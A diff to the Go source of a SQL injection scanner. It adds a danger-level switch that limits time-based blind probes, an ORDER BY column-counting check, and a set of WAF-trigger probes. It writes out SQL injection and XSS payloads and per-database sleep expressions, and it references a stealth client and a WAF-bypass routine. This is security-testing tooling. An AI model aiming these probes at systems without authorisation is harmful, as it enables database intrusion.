@@ -126,20 +126,31 @@ type WAFDetection struct {
 	Matched     []string
 }
 
-// wafProbes: 原始恶意 payload（不含绕过形式——绕过形式用于 BypassWAF 阶段）
+// wafProbes: WAF 触发探测 payload（默认全部无害签名：无 alert(1)/SLEEP/写操作）。
+// 保留可触发 WAF 规则的攻击签名形态（OR 1=1 / union select / svg onload），
+// 但不含真实恶意载荷——对无 WAF 目标也不会构成实际攻击。
+// 时间盲注类探测（SLEEP）在 -danger-level ≥1 才追加（见 DetectWAF）。
 var wafProbes = []string{
 	"' OR '1'='1", "1 AND 1=1", "union select 1,2,3",
-	"1;SELECT SLEEP(5)", "<script>alert(1)</script>",
+	"<svg/onload=1>",
 }
 
+// wafProbesTime: 时间盲注类 WAF 探测，仅 -danger-level ≥1 时发送（SLEEP≤1s）。
+var wafProbesTime = []string{"1;SELECT SLEEP(1)"}
+
 // DetectWAF 对目标检测 WAF
-func DetectWAF(baseURL, param string, c *stealth.Client) WAFDetection {
-	d := WAFDetection{TotalProbes: len(wafProbes)}
+// dangerLevel: 0 只发无害签名（默认）；≥1 追加 SLEEP(1) 时间盲注探测。
+func DetectWAF(baseURL, param string, dangerLevel int, c *stealth.Client) WAFDetection {
+	probes := append([]string{}, wafProbes...)
+	if dangerLevel >= 1 {
+		probes = append(probes, wafProbesTime...)
+	}
+	d := WAFDetection{TotalProbes: len(probes)}
 	sBase, bBase, _, _ := get(baseURL, c)
 	baseLen := len(bBase)
 	matched := map[string]bool{}
 
-	for _, p := range wafProbes {
+	for _, p := range probes {
 		u := mutate(baseURL, param, p)
 		s, b, hdrs, _ := get(u, c)
 		isBlock := false
@@ -304,13 +315,66 @@ func checkUnion(baseURL, param string, p DBMS, c *stealth.Client) (bool, string)
 	return false, ""
 }
 
-func checkTime(baseURL, param string, p DBMS, c *stealth.Client) bool {
+// checkOrderBy: ORDER BY 列数探测（只读，SQLi 标准检测序列之一）。
+// ORDER BY N 正常（200）→ 继续；超过列数 → DB 报错（≥400）→ 差分即注入证据。
+// 需先有成功响应再出错（避免非 SQL 上下文误报）。
+func checkOrderBy(baseURL, param string, c *stealth.Client) (bool, int) {
+	seenOK := false
+	for n := 1; n <= 16; n++ {
+		u := mutate(baseURL, param, fmt.Sprintf("1 ORDER BY %d-- ", n))
+		s, _, _, _ := get(u, c)
+		if s == 200 || s == 201 || s == 302 {
+			seenOK = true
+			continue
+		}
+		if seenOK && (s >= 400 || s == 0) {
+			return true, n - 1
+		}
+	}
+	return false, 0
+}
+
+// sleepForLevel: 时间盲注 payload 按危险级别裁剪。
+// level 1 → 限 ≤1s（SLEEP(1)/WAITFOR '0:0:1'/pg_sleep(1) 等，对业务影响最小）；
+// level 2 → 用 DBMS_PAYLOADS 原始（SLEEP(2)/WAITFOR '0:0:2' 等）。
+func sleepForLevel(db string, dangerLevel int) string {
+	p := DBMS_PAYLOADS[db]
+	if dangerLevel >= 2 {
+		return p.Sleep
+	}
+	switch db {
+	case "mysql", "mariadb", "db2", "vertica", "teradata", "clickhouse", "sybase":
+		return "SLEEP(1)"
+	case "mssql":
+		return "WAITFOR DELAY '0:0:1'"
+	case "postgresql":
+		return "pg_sleep(1)"
+	case "sqlite", "sqlite3":
+		return "randomblob(10000000)"
+	case "oracle":
+		return "DBMS_PIPE.RECEIVE_MESSAGE('a',1)"
+	case "firebird":
+		return "RDB$SET_CONTEXT('USER_TRANSACTION','SLEEP','1')"
+	}
+	return p.Sleep
+}
+
+func checkTime(baseURL, param, db string, dangerLevel int, c *stealth.Client) bool {
+	p := DBMS_PAYLOADS[db]
 	if p.Sleep == "" {
 		return false
 	}
+	sleep := sleepForLevel(db, dangerLevel)
+	if sleep == "" {
+		return false
+	}
 	_, _, _, baseTime := get(baseURL, c)
-	_, _, _, sleepTime := get(mutate(baseURL, param, "1 AND "+p.Sleep), c)
-	return sleepTime-baseTime > 1500*time.Millisecond
+	_, _, _, sleepTime := get(mutate(baseURL, param, "1 AND "+sleep), c)
+	threshold := 1500 * time.Millisecond
+	if dangerLevel == 1 {
+		threshold = 700 * time.Millisecond // ≤1s 睡眠用更敏感阈值
+	}
+	return sleepTime-baseTime > threshold
 }
 
 func checkError(baseURL, param string, c *stealth.Client) bool {
@@ -395,7 +459,10 @@ func BypassWAF(baseURL, param, payload string, c *stealth.Client) (bool, string,
 }
 
 // ---- 主入口 ----
-func Scan(baseURL string, params []string, forceDBMS string, parallel bool, c *stealth.Client) Result {
+// dangerLevel: 0=只读探测（默认，安全）; 1=+时间盲注(SLEEP≤1s); 2=+完整 payload 集。
+// 默认检测序列（level 0）全部只读：' 探错 / ; 探错 / AND 1=1,1=2 布尔 /
+// ORDER BY 数列 / UNION SELECT 提列——无任何写操作（INSERT/UPDATE/DELETE/DROP）。
+func Scan(baseURL string, params []string, forceDBMS string, parallel bool, dangerLevel int, c *stealth.Client) Result {
 	res := Result{Target: baseURL}
 	var findings []Finding
 	var mu sync.Mutex
@@ -413,13 +480,17 @@ func Scan(baseURL string, params []string, forceDBMS string, parallel bool, c *s
 		if checkBoolean(baseURL, param, p, c) {
 			f.Types = append(f.Types, "boolean")
 		}
+		if ok, cols := checkOrderBy(baseURL, param, c); ok {
+			f.Types = append(f.Types, fmt.Sprintf("order_by(%d)", cols))
+		}
 		if ok, _ := checkUnion(baseURL, param, p, c); ok {
 			f.Types = append(f.Types, "union")
 		}
 		if checkError(baseURL, param, c) {
 			f.Types = append(f.Types, "error")
 		}
-		if checkTime(baseURL, param, p, c) {
+		// 时间盲注默认关闭（level 0）；level≥1 显式启用且 SLEEP≤1s
+		if dangerLevel >= 1 && checkTime(baseURL, param, db, dangerLevel, c) {
 			f.Types = append(f.Types, "time")
 		}
 		f.Injectable = len(f.Types) > 0
